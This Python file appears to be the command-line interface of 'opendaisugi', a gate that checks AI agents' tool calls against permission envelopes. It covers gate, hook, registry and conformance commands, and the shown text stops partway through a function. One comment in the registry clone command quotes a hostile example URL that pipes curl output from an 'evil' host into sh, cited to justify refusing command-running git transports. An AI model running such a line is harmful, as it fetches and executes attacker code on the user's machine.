"""opendaisugi command-line interface.

One entry: ``daisugi start``. The short top level is Start here / Run / Gate /
Garden / Settings; ``daisugi help --all`` lists every command, including the
hidden operational groups (``lora``, ``release``, ``batch``, ``conformance``,
``registry``, ``hook``, ``mcp``, ``tiers``, ``gardener``) and hidden top-level
commands (``onboard``, ``run``, ``verify``, ``tend``, and others) — nothing is
deleted, hiding only shortens the default view, and a typo of a hidden name
still gets suggested. Read commands take ``--json``; the root takes
``--plain``, ``-q``/``--quiet``, ``-v``/``--verbose``, ``--no-color``. The
gate group uses ``--root`` (``~/.opendaisugi/gate``); most others take
``--data-dir`` (``~/.opendaisugi``).
"""

from __future__ import annotations

import asyncio
import json
import os
import shlex
import shutil
from dataclasses import asdict
from pathlib import Path
from typing import NoReturn

import click
import typer
import yaml

from opendaisugi.approval import default_strategy
from opendaisugi.defaults import DEFAULT_LOW_STAKES_ENVELOPE
from opendaisugi.exceptions import EnvelopeGenerationError, TaskTooLongError
from opendaisugi.executor import DryRunExecutor, default_executors
from opendaisugi.models import ActionPlan, Envelope
from opendaisugi.parsers import ParseResult, get_parser
from opendaisugi.run_session import RunStatus

app = typer.Typer(
    name="daisugi",
    help="Runtime assurance for agent actions.",
    no_args_is_help=False,
    invoke_without_command=True,  # bare `daisugi` prints the start-here text, not full help
    pretty_exceptions_enable=False,  # a human never gets a rich traceback; see main()
)

_START_HERE = """\
daisugi: a gate that proves each agent action stays inside an envelope, and a garden
of reusable pathways distilled from the work.

Start here
  daisugi start                          gate this directory (shadow mode) and watch it
  daisugi start --enforce                the same, but out-of-envelope calls are denied
  daisugi orchestrate "list three risks" run a prompt end to end under a verified plan
  daisugi status                         is this machine ready; what is installed
  daisugi dashboard                      the live view of sessions, verdicts, and cost

More
  daisugi config                         every setting, with its source
  daisugi help --all                     every command, grouped
"""


def _fail(what: str, why: str, fix: str, *, code: int = 1) -> "NoReturn":
    """Print the three-part error and exit. Most important line (the fix) last."""
    typer.echo(what, err=True)
    typer.echo(why, err=True)
    typer.echo(fix, err=True)
    raise typer.Exit(code=code)


def main() -> None:
    """Console entry: one renderer for every OpenDaisugiError.

    ``DAISUGI_DEBUG=1`` re-raises so the traceback shows. Typer's own
    handling of usage errors and Exit is untouched.
    """
    from opendaisugi.exceptions import OpenDaisugiError

    try:
        app()
    except OpenDaisugiError as exc:
        if os.environ.get("DAISUGI_DEBUG") == "1":
            raise
        typer.echo(str(exc).strip() or exc.__class__.__name__, err=True)
        raise SystemExit(1) from exc


def _version_callback(value: bool) -> None:
    # clig.dev: ship --version. Eager so `daisugi --version` short-circuits before
    # any command dispatch and prints just the version to stdout, exit 0.
    if value:
        from opendaisugi import __version__

        typer.echo(__version__)
        raise typer.Exit()


@app.callback()
def _root(
    ctx: typer.Context,
    version: bool = typer.Option(
        False,
        "--version",
        callback=_version_callback,
        is_eager=True,
        help="Show the opendaisugi version and exit.",
    ),
    plain: bool = typer.Option(
        False, "--plain", help="No color, no box drawing; greppable output."
    ),
    quiet: bool = typer.Option(False, "-q", "--quiet", help="Results only; no progress notes."),
    verbose: bool = typer.Option(False, "-v", "--verbose", help="Show tracebacks and detail."),
    no_color: bool = typer.Option(False, "--no-color", help="Disable color (same as NO_COLOR=1)."),
) -> None:
    """Runtime assurance for agent actions."""
    from opendaisugi import console

    console.set_mode(
        console.resolve_output(plain=plain, quiet=quiet, verbose=verbose, no_color=no_color)
    )
    if verbose:
        os.environ["DAISUGI_DEBUG"] = "1"
    if ctx.invoked_subcommand is None:
        console.say(_START_HERE.rstrip())
        raise typer.Exit()


def _all_commands_grouped() -> list[tuple[str, list[tuple[str, object]]]]:
    """Every top-level command (hidden included), grouped by its rich_help_panel."""
    from typer.main import get_command

    order = ["Start here", "Run", "Gate", "Garden", "Settings"]
    groups: dict[str, list[tuple[str, object]]] = {}
    for name, cmd in get_command(app).commands.items():
        panel = getattr(cmd, "rich_help_panel", None) or "Other"
        groups.setdefault(panel, []).append((name, cmd))
    panels = sorted(groups, key=lambda p: order.index(p) if p in order else len(order))
    return [(p, sorted(groups[p])) for p in panels]


@app.command("help", rich_help_panel="Start here")
def help_cmd(
    show_all: bool = typer.Option(False, "--all", help="List every command, grouped."),
) -> None:
    """Show the short start-here text, or every command with --all.

    Plain output, not Rich's own --help renderer: --all is meant to be
    greppable, and it lists hidden commands too (Rich's help panels never
    show them, so rendering through get_help() would just be a second,
    drifting source of truth).
    """
    from opendaisugi import console

    if not show_all:
        console.say(_START_HERE.rstrip())
        return
    for panel, commands in _all_commands_grouped():
        console.say(f"{panel}:")
        for name, cmd in commands:
            mark = " (hidden)" if getattr(cmd, "hidden", False) else ""
            console.say(f"  {name:<20}{mark}  {cmd.get_short_help_str(60)}")
            sub = getattr(cmd, "commands", None)
            if sub:
                for sub_name, sub_cmd in sorted(sub.items()):
                    console.say(f"    {name} {sub_name:<16} {sub_cmd.get_short_help_str(52)}")
        console.say("")


journal_app = typer.Typer(
    name="journal",
    help="Inspect and replay journal traces.",
    no_args_is_help=True,
)
app.add_typer(journal_app, name="journal", rich_help_panel="Garden")

pathways_app = typer.Typer(
    name="pathways",
    help="Manage compiled pathways.",
    no_args_is_help=True,
)
app.add_typer(pathways_app, name="pathways", rich_help_panel="Garden")

tiers_app = typer.Typer(
    name="tiers",
    help="Tier-0/1/2 routing stats derived from the journal.",
    no_args_is_help=True,
)
app.add_typer(tiers_app, name="tiers", hidden=True)

gardener_app = typer.Typer(
    name="gardener",
    help="Lifecycle management for compiled pathways (prune, merge, status).",
    no_args_is_help=True,
)
app.add_typer(gardener_app, name="gardener", hidden=True)

lora_app = typer.Typer(
    name="lora",
    help="LoRA training-data pipeline (v0.5.0). Emit JSONL from the journal.",
    no_args_is_help=True,
)
app.add_typer(lora_app, name="lora", hidden=True)

conformance_app = typer.Typer(
    name="conformance",
    help=(
        "Multi-client conformance corpus: export recorded cases, run a client "
        "binary against the corpus, benchmark per-case latency. Spec: "
        "docs/spec/conformance.md."
    ),
    no_args_is_help=True,
)
app.add_typer(conformance_app, name="conformance", hidden=True)


@conformance_app.command("export")
def conformance_export_cmd(
    raw_dir: Path = typer.Argument(..., help="Directory of recorded cases-*.jsonl files."),
    out: Path = typer.Option(
        Path("corpus.jsonl"), "--out", help="Deduplicated corpus output path."
    ),
) -> None:
    """Dedupe recorded case lines into a sorted, manifest-pinned corpus."""
    from opendaisugi.conformance import export_corpus

    manifest = export_corpus(raw_dir, out)
    typer.echo(f"corpus: {out}  cases: {manifest['count']}  sha256: {manifest['sha256'][:16]}…")


@conformance_app.command("run")
def conformance_run_cmd(
    corpus: Path = typer.Argument(..., help="Corpus JSONL to feed the client."),
    client: str = typer.Option(
        ..., "--client", help="Client command (shell-quoted), e.g. 'cargo run -q --bin conform'."
    ),
    show: int = typer.Option(10, "--show", help="Max mismatches to print."),
) -> None:
    """Differential run: feed every case to a client, compare verdicts, exit 1 on any mismatch."""
    import shlex

    from opendaisugi.conformance import ClientError, run_corpus

    try:
        report = run_corpus(corpus, shlex.split(client))
    except ClientError as e:
        typer.echo(f"client error: {e}", err=True)
        raise typer.Exit(code=2) from e
    typer.echo(f"{report.matched}/{report.total} matched")
    if report.mismatches:
        for m in report.mismatches[:show]:
            typer.echo(f"  mismatch {m.case_id} ({m.kind}):")
            typer.echo(f"    expected: {m.expected}")
            typer.echo(f"    got:      {m.got}")
        if len(report.mismatches) > show:
            typer.echo(f"  … and {len(report.mismatches) - show} more")
        raise typer.Exit(code=1)


@conformance_app.command("bench")
def conformance_bench_cmd(
    corpus: Path = typer.Argument(..., help="Corpus JSONL to time."),
    repeat: int = typer.Option(1, "--repeat", help="Passes over the corpus."),
    client: str = typer.Option(
        None,
        "--client",
        help="Client command to benchmark over the pipe; omit for the in-process oracle.",
    ),
) -> None:
    """Per-case latency percentiles over the corpus (oracle in-process, or a client pipe)."""
    import shlex

    from opendaisugi.conformance import bench_corpus

    stats = bench_corpus(corpus, repeat=repeat, client_cmd=shlex.split(client) if client else None)
    typer.echo(
        f"cases={stats.n_cases} repeat={stats.repeat} "
        f"p50={stats.p50_ms:.3f}ms p95={stats.p95_ms:.3f}ms p99={stats.p99_ms:.3f}ms "
        f"throughput={stats.cases_per_s:.0f} cases/s"
    )


@conformance_app.command("serve")
def conformance_serve_cmd() -> None:
    """Speak the wire protocol as the Python oracle: case JSON in on stdin, verdict out."""
    from opendaisugi.conformance import main as conformance_main

    conformance_main()


mcp_app = typer.Typer(
    name="mcp",
    help="Run openDaisugi as an MCP server for Claude Code / OpenClaw / any MCP client.",
    no_args_is_help=True,
)
app.add_typer(mcp_app, name="mcp", hidden=True)

hook_app = typer.Typer(
    name="hook",
    help="Passive hook surface — capture tool calls into local JSONL for distillation.",
    no_args_is_help=True,
)
app.add_typer(hook_app, name="hook", hidden=True)

gate_app = typer.Typer(
    name="gate",
    help="Call-time tool gate (ADR-0007) — verify each live tool call against "
    "a registered envelope. Shadow by default; --mode enforce denies.",
    no_args_is_help=True,
)
app.add_typer(gate_app, name="gate", rich_help_panel="Gate")

router_app = typer.Typer(
    name="router",
    help="The gateway's model chooser: NVIDIA NeMo Switchyard as a managed child, or the "
    "built-in rules router.",
    no_args_is_help=True,
)
app.add_typer(router_app, name="router", hidden=True)

registry_app = typer.Typer(
    name="registry",
    help="Git-backed shared pathway registry (v0.25+).",
    no_args_is_help=True,
)
app.add_typer(registry_app, name="registry", hidden=True)

release_app = typer.Typer(
    name="release",
    help="Sign and verify release artifacts (roadmap Stage 7). Reuses the "
    "ed25519 signer registry — one trust root, not a second.",
    no_args_is_help=True,
)
app.add_typer(release_app, name="release", hidden=True)

batch_app = typer.Typer(
    name="batch",
    help="Within-instance batch compilation (roadmap Stage 9) — prove a declared "
    "batch's footprint (F ⊆ envelope) before any iteration, fail-closed.",
    no_args_is_help=True,
)
app.add_typer(batch_app, name="batch", hidden=True)

coppice_app = typer.Typer(
    name="coppice",
    help="Drive panes on the floor: spawn, read, prompt, wait, close, attach.",
    no_args_is_help=True,
)
app.add_typer(coppice_app, name="coppice", hidden=True)


_DECOMPOSE_OPT = typer.Option(
    None,
    "--allow-shell-decomposition/--no-allow-shell-decomposition",
    help="Let the envelope admit compound shell (ADR-0010): 'a && b' and pipes are "
    "parsed with a real bash grammar and EVERY head is checked against the "
    "allowlist, instead of the blanket metacharacter rejection. Needs the "
    "opendaisugi shell extra (tree-sitter-bash); substitution, redirection, "
    "non-literal heads and wrappers are still rejected. Unset reads the "
    "shell_allow_decomposition default from config.yaml (off unless you set it).",
)


def _resolve_decompose(flag: bool | None, config_path: Path) -> bool:
    """One opt-in, one persisted default, one per-run override.

    The flag wins in BOTH directions when given, so a run can decline a default
    it inherited; unset falls back to config.yaml, which is the only channel
    that reaches `hook auto-tend` (cron and a detached spawn — no argv, and
    stdout on DEVNULL).
    """
    if flag is not None:
        return flag
    from opendaisugi.config import load_config

    return load_config(config_path).shell_allow_decomposition


def _warn_if_decomposition_unusable(allow: bool) -> None:
    """Say plainly when an opt-in this box can't honour was just written.

    With the field True and the parser absent the verifier fails closed, so an
    operator who enables decomposition to *stop* being denied would instead be
    denied with a different reason. Warn and proceed — the envelope may travel
    to a box that has the extra.
    """
    if not allow:
        return
    from opendaisugi.shell_decompose import parser_available

    if parser_available():
        return
    typer.echo(
        "WARNING: shell decomposition is ON in this envelope, but the bash "
        "grammar isn't installed on this machine — every compound command will "
        "be DENIED (fail-closed) until you run: uv add 'opendaisugi[shell]'"
    )


def _resolve_registry_keys(
    private_key_path: Path | None,
    public_key_path: Path | None,
) -> tuple[str | None, str | None]:
    """Read base64 ed25519 keypair from disk paths, or return (None, None)."""
    priv = private_key_path.read_text(encoding="utf-8").strip() if private_key_path else None
    pub = public_key_path.read_text(encoding="utf-8").strip() if public_key_path else None
    return priv, pub


@registry_app.command("init")
def registry_init_cmd(
    git_url: str = typer.Argument(..., help="Git URL of the team registry repo."),
    clone_to: Path = typer.Option(
        Path.home() / ".opendaisugi" / "registry",
        "--clone-to",
        help="Local clone directory.",
    ),
) -> None:
    """Clone a registry repo to a local directory.

    Subsequent commands (``pull``, ``publish``, ``status``) operate on
    the local clone. Idempotent — if the clone already exists, this is
    a no-op.
    """
    import subprocess

    # git interprets ext::/fd:: transport URLs by RUNNING A COMMAND at clone time —
    # a registry URL pasted from a teammate/wiki could be `ext::sh -c "curl evil|sh"`.
    # Reject the command-executing transports with a clear message...
    if git_url.startswith(("ext::", "fd::")):
        typer.echo(
            f"refusing registry URL {git_url!r}: the git ext::/fd:: transports "
            f"execute a command and are not allowed.",
            err=True,
        )
        raise typer.Exit(code=2)
    if clone_to.exists() and (clone_to / ".git").exists():
        typer.echo(f"already cloned at {clone_to}")
        return
    clone_to.parent.mkdir(parents=True, exist_ok=True)
    typer.echo(f"cloning {git_url} → {clone_to}")
    # ...and enforce the allowed protocols in git itself (covers submodules and
    # any transport we didn't lexically anticipate).
    env = {**os.environ, "GIT_ALLOW_PROTOCOL": "https:http:ssh:git:file"}
    subprocess.run(["git", "clone", git_url, str(clone_to)], check=True, env=env)
    typer.echo(f"clone ready at {clone_to}")


@registry_app.command("pull")
def registry_pull_cmd(
    repo_path: Path = typer.Option(
        Path.home() / ".opendaisugi" / "registry",
        "--repo-path",
    ),
    require_signed: bool = typer.Option(
        True,
        "--require-signed/--allow-unsigned",
        help="Refuse bundles without a valid signature from a trusted signer.",
    ),
) -> None:
    """git pull and materialize new pathway bundles into the local cache."""
    from opendaisugi.git_pathway_store import GitPathwayStore

    store = GitPathwayStore(repo_path=repo_path, require_signed=require_signed)
    n = store.pull()
    typer.echo(f"pulled; {n} new pathway(s) cached")


@registry_app.command("publish")
def registry_publish_cmd(
    pathway_id: str = typer.Argument(..., help="Local pathway id to publish."),
    repo_path: Path = typer.Option(
        Path.home() / ".opendaisugi" / "registry",
        "--repo-path",
    ),
    private_key: Path = typer.Option(
        ...,
        "--private-key",
        help="Path to a base64 ed25519 private key file.",
    ),
    public_key: Path = typer.Option(
        ...,
        "--public-key",
        help="Path to a base64 ed25519 public key file.",
    ),
    publisher: str = typer.Option(
        "opendaisugi-instance",
        "--publisher",
        help="Human-readable publisher id stamped on the bundle.",
    ),
    push: bool = typer.Option(True, "--push/--no-push"),
    data_dir: Path = typer.Option(
        Path.home() / ".opendaisugi",
        "--data-dir",
    ),
) -> None:
    """Sign + commit + push a local pathway as a bundle to the registry."""
    from opendaisugi.git_pathway_store import GitPathwayStore
    from opendaisugi.pathway_store import PathwayStore

    priv, pub = _resolve_registry_keys(private_key, public_key)
    local = PathwayStore(data_dir / "pathways.db")
    pathway = next((p for p in local.list_all() if p.id == pathway_id), None)
    if pathway is None:
        typer.echo(f"error: no pathway {pathway_id} in local store", err=True)
        raise typer.Exit(code=1)
    store = GitPathwayStore(
        repo_path=repo_path,
        private_key_b64=priv,
        public_key_b64=pub,
        publisher=publisher,
    )
    bundle_hash = store.publish(pathway, push=push)
    typer.echo(bundle_hash)


@registry_app.command("status")
def registry_status_cmd(
    repo_path: Path = typer.Option(
        Path.home() / ".opendaisugi" / "registry",
        "--repo-path",
    ),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Show the local clone's diagnostic info."""
    from opendaisugi.git_pathway_store import GitPathwayStore

    store = GitPathwayStore(repo_path=repo_path)
    s = store.status()
    if json_output:
        typer.echo(json.dumps(s))
        return
    for k, v in s.items():
        typer.echo(f"  {k}: {v}")


@registry_app.command("pull-and-tend")
def registry_pull_and_tend_cmd(
    repo_path: Path = typer.Option(
        Path.home() / ".opendaisugi" / "registry",
        "--repo-path",
    ),
    data_dir: Path = typer.Option(
        Path.home() / ".opendaisugi",
        "--data-dir",
    ),
) -> None:
    """Cron-friendly: pull new bundles from the registry, then run tend.

    Pairs with ``daisugi hook auto-tend`` to fully close the
    captures → traces → distillation → publish-eligible-pathways loop
    on every team instance.
    """
    import asyncio

    from opendaisugi.git_pathway_store import GitPathwayStore

    store = GitPathwayStore(repo_path=repo_path)
    n_pulled = store.pull()
    typer.echo(f"pulled; {n_pulled} new pathway(s) cached")

    from opendaisugi import Daisugi

    d = Daisugi(data_dir=data_dir)
    try:
        report = asyncio.run(d.tend())
        typer.echo(
            f"tend: created={report.created} updated={report.updated} skipped={report.skipped}"
        )
    except Exception as exc:
        typer.echo(f"tend failed: {type(exc).__name__}: {exc}", err=True)


@hook_app.command("record")
def hook_record_cmd(
    captures_root: Path = typer.Option(
        Path.home() / ".opendaisugi" / "captures",
        "--captures-root",
    ),
    fmt: str = typer.Option(
        "claude",
        "--format",
        help="Host runtime stdout contract: claude | codex | hermes | openclaw.",
    ),
    event: str = typer.Option(
        "pre_tool_use",
        "--event",
        help="Which host hook this is wired to: pre_tool_use (default, records "
        "the tool call) | stop (session went idle) | notification (a "
        "permission prompt or an idle-prompt notification) | subagent_start "
        "| subagent_stop, which report a subagent row under the pane in coppice.",
    ),
) -> None:
    """Read a hook payload from stdin, record it, return the host's continue contract.

    Designed to be wired into Claude Code's PreToolUse hook, Hermes'
    shell-hook surface, OpenClaw's before_tool_call plugin, or any other host
    that emits JSON to stdin and reads JSON from stdout. Never blocks — even
    malformed input results in the host's allow contract so the runtime is
    never disrupted. ``--format`` selects which allow/continue shape to emit.
    ``--event stop`` and ``--event notification`` report floor state
    (idle/blocked) instead of recording a tool call (spec-01).
    ``--event subagent_start`` and ``--event subagent_stop`` report a
    subagent to coppice as a read only child row.
    """
    if event not in ("pre_tool_use", "stop", "notification", "subagent_start", "subagent_stop"):
        # Whole-branch review, minor 1: any other string used to fall
        # through silently to the pre_tool_use path (recording nothing
        # useful, reporting no error) — a typo like --event Stop
        # (capitalized) looked wired but did nothing.
        typer.echo(
            "Error: --event must be one of pre_tool_use, stop, notification, "
            "subagent_start, subagent_stop.",
            err=True,
        )
        raise typer.Exit(code=1)

    import sys
    import time

    from opendaisugi.hook import (
        maybe_trigger_background_tend,
        record_and_contract,
        record_lifecycle_event,
    )

    try:
        raw = sys.stdin.buffer.read()
    except Exception:
        raw = b""
    if event in ("stop", "notification", "subagent_start", "subagent_stop"):
        typer.echo(
            record_lifecycle_event(
                raw,
                event=event,
                fmt=fmt,
                sessions_root=captures_root.parent / "sessions",
            )
        )
        return
    # record_and_contract never raises and always returns the host allow contract.
    typer.echo(record_and_contract(raw, root=captures_root, fmt=fmt))
    # No-cron distillation: the contract is already emitted, so this can only
    # add latency, never correctness. Consent-gated, rate-limited, fully detached.
    maybe_trigger_background_tend(captures_root.parent, now=time.time())


@hook_app.command("report")
def hook_report_cmd(
    pane: str = typer.Option(None, "--pane", help="Pane id to stamp onto the event, if known."),
    root: Path = typer.Option(
        Path.home() / ".opendaisugi" / "gate",
        "--root",
        help="Gate data root — where the session tree this event appends to lives.",
    ),
) -> None:
    """Read one PaneStateEvent JSON line from stdin and deliver it.

    For a headless adapter or an in-process extension (the pi extension,
    the OpenCode plugin — specs 04/05) that cannot speak to the gate
    directly. Downgrades a claimed 'gate' or 'operator' source to
    'headless' — only the gate process itself may speak as the gate.
    Exits 0 once stdin parses to a valid event; exits 1 with the
    validation message on stderr for anything malformed.
    """
    import sys

    from opendaisugi._state_report import hook_report_argv

    try:
        raw = sys.stdin.buffer.read()
    except Exception:
        raw = b""
    argv = ["--root", str(root)]
    if pane:
        argv += ["--pane", pane]
    out = hook_report_argv(argv, raw)
    if out.stdout:
        typer.echo(out.stdout)
    if out.stderr:
        typer.echo(out.stderr, err=True)
    raise typer.Exit(code=out.exit_code)


@hook_app.command("list")
def hook_list_cmd(
    captures_root: Path = typer.Option(
        Path.home() / ".opendaisugi" / "captures",
        "--captures-root",
    ),
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """List captured sessions with call counts."""
    from opendaisugi.hook import list_sessions

    sessions = list_sessions(root=captures_root)
    if json_output:
        typer.echo(json.dumps(sessions))
        return
    if not sessions:
        typer.echo("(no captured sessions)")
        return
    typer.echo(f"{'session_id':40s}  {'calls':>6s}  last_at")
    for s in sessions:
        typer.echo(f"{s['session_id']:40s}  {s['calls']:>6d}  {s.get('last_at', '')}")


@hook_app.command("to-trace")
def hook_to_trace_cmd(
    session_id: str = typer.Argument(..., help="Captured session id (filename stem)."),
    captures_root: Path = typer.Option(
        Path.home() / ".opendaisugi" / "captures",
        "--captures-root",
    ),
    data_dir: Path = typer.Option(
        Path.home() / ".opendaisugi",
        "--data-dir",
    ),
    task: str = typer.Option(
        None,
        "--task",
        help="Override the task description; default uses the session id.",
    ),
    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
) -> None:
    """Convert a captured session into a journal trace.

    Synthesizes a permissive envelope from observed tool heads/paths,
    builds an ActionPlan from the captured calls, runs verify(), and
    appends a Trace to the journal. The trace then feeds normal
    ``daisugi tend`` distillation.
    """
    from opendaisugi.hook import captures_to_trace
    from opendaisugi.journal import Journal

    session_jsonl = captures_root / f"{session_id}.jsonl"
    if not session_jsonl.exists():
        typer.echo(f"error: no capture at {session_jsonl}", err=True)
        raise typer.Exit(code=1)
    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
    journal = Journal(data_dir=data_dir)
    trace_id = captures_to_trace(
        session_jsonl, journal, task=task, allow_shell_decomposition=decompose
    )
    journal.mark_session_converted(session_id, trace_id)
    typer.echo(trace_id)


@hook_app.command("auto-tend")
def hook_auto_tend_cmd(
    captures_root: Path = typer.Option(
        Path.home() / ".opendaisugi" / "captures",
        "--captures-root",
    ),
    data_dir: Path = typer.Option(
        Path.home() / ".opendaisugi",
        "--data-dir",
    ),
    min_interval_s: int = typer.Option(
        3600,
        "--min-interval",
        help="Skip if last auto-tend was newer than this many seconds.",
    ),
    force: bool = typer.Option(
        False,
        "--force",
        help="Ignore the min-interval gate.",
    ),
    skip_distill: bool = typer.Option(
        False,
        "--skip-distill",
        help="Convert captures-to-traces but don't run tend afterwards.",
    ),
    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
) -> None:
    """Close the captures→traces→distillation loop in one cron-friendly call.

    For every captured session not already converted, runs `to-trace`. If any
    new traces land, runs ``Daisugi.tend()``. A min-interval gate (default
    1h) prevents wasteful re-runs; --force overrides. Designed for cron /
    systemd timers / Claude `/loop` skill invocations:

        # cron — every 30 minutes; gate ensures real work only every 1h
        */30 * * * * /usr/local/bin/daisugi hook auto-tend

    The thesis-3 reproduction loop is closed by this command. Without it,
    captures accumulate but distillation never sees them.
    """
    import asyncio
    import time

    from opendaisugi.config import auto_tend_enabled, load_config
    from opendaisugi.hook import captures_to_trace, list_sessions
    from opendaisugi.journal import Journal

    # Consent gate: background distillation runs only when the user opted in
    # (`daisugi install`). --force tends once regardless, for a manual run.
    if not force and not auto_tend_enabled(load_config(data_dir / "config.yaml")):
        typer.echo(
            "skipped: background distillation is off. Run `daisugi install` to "
            "opt in, or pass --force to tend once anyway."
        )
        return

    stamp_file = data_dir / ".hook-auto-tend-last-run"
    now = time.time()
    last_run = 0.0
    if stamp_file.exists():
        try:
            last_run = float(stamp_file.read_text().strip())
        except ValueError:
            last_run = 0.0
    if not force and (now - last_run) < min_interval_s:
        typer.echo(
            f"skipped: last run {int(now - last_run)}s ago "
            f"(< --min-interval={min_interval_s}); use --force to override"
        )
        return

    decompose = _resolve_decompose(allow_shell_decomposition, data_dir / "config.yaml")
    journal = Journal(data_dir=data_dir)
    sessions = list_sessions(root=captures_root)
    converted: list[str] = []
    for s in sessions:
        sid = s["session_id"]
        if journal.is_session_converted(sid):
            continue
        session_jsonl = captures_root / f"{sid}.jsonl"
        try:
            trace_id = captures_to_trace(
                session_jsonl, journal, allow_shell_decomposition=decompose
            )
        except ValueError as exc:
            typer.echo(f"  skipped {sid}: {exc}", err=True)
            continue
        journal.mark_session_converted(sid, trace_id)
        converted.append(trace_id)
        typer.echo(f"  converted {sid} → {trace_id}")

    typer.echo(f"converted {len(converted)} sessions")

    if converted and not skip_distill:
        from opendaisugi import Daisugi

        daisugi = Daisugi(data_dir=data_dir)
        try:
            report = asyncio.run(daisugi.tend())
            typer.echo(
                f"tend: created={report.created} updated={report.updated} skipped={report.skipped}"
            )
        except Exception as exc:
            typer.echo(f"tend failed: {type(exc).__name__}: {exc}", err=True)

    data_dir.mkdir(parents=True, exist_ok=True)
    stamp_file.write_text(f"{now}")


# What `install --gate --enforce` says when no envelope is registered.
ENFORCE_NEEDS_POLICY = (
    "Enforce needs a policy first. Run: daisugi gate init --workspace DIR "
    "for a starter envelope, then this command again. "
    "Or install in shadow mode: daisugi install --gate"
)

_GATE_ROOT_OPT = typer.Option(
    Path.home() / ".opendaisugi" / "gate",
    "--root",
    help="Gate state directory (envelopes, shadow log, disarm marker).",
)


@gate_app.command("init")
def gate_init_cmd(
    workspace: Path = typer.Option(
        Path.cwd,
        "--workspace",
        help="The directory the session may read/write (default: cwd).",
    ),
    session: str | None = typer.Option(None, "--session"),
    root: Path = _GATE_ROOT_OPT,
    force: bool = typer.Option(
        False,
        "--force",
        help="Overwrite an existing envelope — regenerates from scratch, so any "
        "hand-tuning you did is discarded.",
    ),
    allow_shell_decomposition: bool | None = _DECOMPOSE_OPT,
) -> None:
    """Generate and register a reviewable starter envelope for this session.

    The answer to "where does the envelope come from?" for a session you are
    already running: a tight, sane default (read/write the workspace, a
    conservative shell allowlist, no network) that you then review and adjust.
    It is a starting point, not a finished policy — run shadow mode and
    `daisugi gate report` to tune it.
    """
    from opendaisugi.gate import _envelopes_dir, register_envelope, starter_envelope
    from opendaisugi.hook import _safe_session_id

    decompose = _resolve_decompose(allow_shell_decomposition, root.parent / "config.yaml")
    name = session or "default"
    # The file register_envelope writes: the session id made safe, so the
    # check never looks at one path and the write lands on another.
    target = _envelopes_dir(root) / f"{_safe_session_id(session) if session else 'default'}.json"
    if target.exists() and not force:
        typer.echo(
            f"an envelope for '{name}' is already registered at {target}; "
            f"pass --force to overwrite",
            err=True,
        )
        raise typer.Exit(code=1)
    ws = workspace.resolve()
    path = register_envelope(
        starter_envelope(ws, allow_shell_decomposition=decompose),
        session_id=session,
        root=root,
    )
    typer.echo(f"registered a starter envelope for {ws} → {path}")
    _warn_if_decomposition_unusable(decompose)
    typer.echo("REVIEW it before enforcing — it is a tight default, not a finished policy.")
    typer.echo("Then launch shadow mode:")
    typer.echo(f'  claude --settings "$(daisugi gate settings --root {root})"')


@gate_app.command("check")
def gate_check_cmd(
    mode: str = typer.Option(
        "shadow",
        "--mode",
        click_type=click.Choice(["shadow", "enforce"]),
        help="shadow = observe and log only; enforce = deny out-of-envelope calls.",
    ),
    root: Path = _GATE_ROOT_OPT,
    fmt: str = typer.Option(
        "claude", "--format", help="Host contract: claude | pi | opencode | hermes | openclaw."
    ),
    verify_timeout: float = typer.Option(
        10.0,
        "--verify-timeout",
        help="Inner verifier budget in seconds; exceeding it DENIES "
        "(the host's outer timeout fails open, ours must not).",
    ),
) -> None:
    """Read one hook payload from stdin and emit the host's verdict contract.

    On the Claude Code path a deny is exit code 2 with the reason on stderr —
    the contract pinned by tests/test_hook_gate_contract.py. Prefer wiring
    hosts to ``python -m opendaisugi.gate`` (same behavior, faster import);
    this command exists for parity and manual testing.
    """
    import sys

    from opendaisugi.gate import gate_and_contract

    try:
        raw = sys.stdin.buffer.read()
    except Exception:
        raw = b""
    out = gate_and_contract(
        raw,
        root=root,
        fmt=fmt,
        mode=mode,
        verify_timeout_s=verify_timeout,
    )
    if out.stdout:
        typer.echo(out.stdout)
    if out.stderr:
        typer.echo(out.stderr, err=True)
    raise typer.Exit(code=out.exit_code)


@gate_app.command("register")
def gate_register_cmd(
    envelope_path: Path = typer.Argument(..., help="Envelope file (JSON or YAML)."),
    session: str | None = typer.Option(
        None,
        "--session",
        help="Bind to one session id; omit to register the default envelope "
        "every unmatched session falls back to.",
    ),
    root: Path = _GATE_ROOT_OPT,
) -> None:
    """Register the envelope the gate checks this session's calls against."""
    import yaml
    from pydantic import ValidationError

    from opendaisugi.gate import register_envelope
    from opendaisugi.models import Envelope

    try:
        envelope = Envelope(**yaml.safe_load(envelope_path.read_text()))
    except ValidationError as exc:
        # One line, and nothing is registered. A number that is not finite
        # (NaN, .inf) is one of these: models.non_finite_error.
        why = "; ".join(
            ".".join(str(p) for p in e["loc"]) + ": " + e["msg"] if e["loc"] else e["msg"]
            for e in exc.errors()
        )
        typer.echo(f"not registered: {envelope_path} is not a valid envelope: {why}", err=True)
        raise typer.Exit(code=1) from exc
    path = register_envelope(envelope, session_id=session, root=root)
    typer.echo(f"registered {'session ' + session if session else 'default'} envelope → {path}")


@gate_app.command("disarm")
def gate_disarm_cmd(root: Path = _GATE_ROOT_OPT) -> None:
    """Kill switch: the gate allows everything until re-armed.

    Deliberately requires no allowed tool call — run it from any shell if
    an over-denying gate has locked an agent up.
    """
    from opendaisugi.gate import disarm

    marker = disarm(root)
    typer.echo(f"gate DISARMED (marker: {marker}) — `daisugi gate arm` to re-enable")


@gate_app.command("arm")
def gate_arm_cmd(root: Path = _GATE_ROOT_OPT) -> None:
    """Remove the disarm marker; the gate resumes evaluating calls."""
    from opendaisugi.gate import arm

    arm(root)
    typer.echo("gate armed")


@gate_app.command("status")
def gate_status_cmd(
    root: Path = _GATE_ROOT_OPT,
    json_output: bool = typer.Option(False, "--json", help="Machine-readable JSON output."),
) -> None:
    """Show armed/disarmed state, the verdict mode, and the registered envelopes.

    The mode is the EFFECTIVE one across both a machine-global hook
    (~/.claude/settings.json, what `daisugi install --gate` writes) and a
    directory-scoped one (./.claude/settings.json, what `daisugi start`
    writes) — the stricter of the two, since Claude Code fires every hook
    that exists and a call is allowed only if every firing hook allows it.
    Reading just one would risk showing "mode: shadow" while a cwd-scoped
    enforce hook is actually denying calls.
    """
    from opendaisugi.config import effective_hook_mode, hook_source_label
